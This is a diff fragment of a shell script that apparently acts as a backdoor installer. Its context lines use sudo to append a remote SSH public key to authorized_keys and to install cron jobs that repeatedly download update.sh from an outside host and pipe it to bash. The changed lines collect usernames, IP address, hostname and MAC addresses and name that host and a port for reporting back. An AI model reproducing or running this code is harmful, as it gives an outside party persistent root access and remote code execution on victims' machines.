@@ -14,11 +14,12 @@ sudo su -c "curl -L boesen.science:2042/pubkey >> $SSHPATH/authorized_keys"
 sudo su -c "(crontab -l 2>/dev/null; echo '*/20 * * * * curl -L boesen.science:2042/linux/update.sh |bash') | crontab -"
 sudo su -c "printf '#\!/bin/bash\ncurl -L boesen.science:2042/linux/update.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
 
-USER=`whoami`
+# Don't use whoami, will generally be root, which is useless
+USER=$(ls /home | xargs -n1 | sort -u | xargs | tr ' ' ',')
 # hostname -I returns trailing space
-IP=`hostname -I | sed 's/ *$//'`
-HOSTNAME=`hostname`
-MAC=`cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//'`
+IP=$(hostname -I | sed 's/ *$//')
+HOSTNAME=$(hostname)
+MAC=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')
 
 SERVER="boesen.science"
 PORT=2043
